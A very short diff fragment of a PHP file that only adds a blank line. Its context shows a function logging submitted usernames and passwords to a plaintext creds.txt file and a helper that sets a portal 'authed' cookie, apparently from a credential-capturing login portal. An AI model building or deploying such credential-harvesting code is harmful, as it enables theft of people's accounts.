@@ -5,6 +5,7 @@ function log_credentials(string $type, string $user, string $pass) {
     file_put_contents(__DIR__ . '/creds.txt', $entry, FILE_APPEND | LOCK_EX);
 }
 
+
 function helper_redirect(?string $url) {
     setcookie('custom_portal_authed', '1', time() + 3600, '/');
 
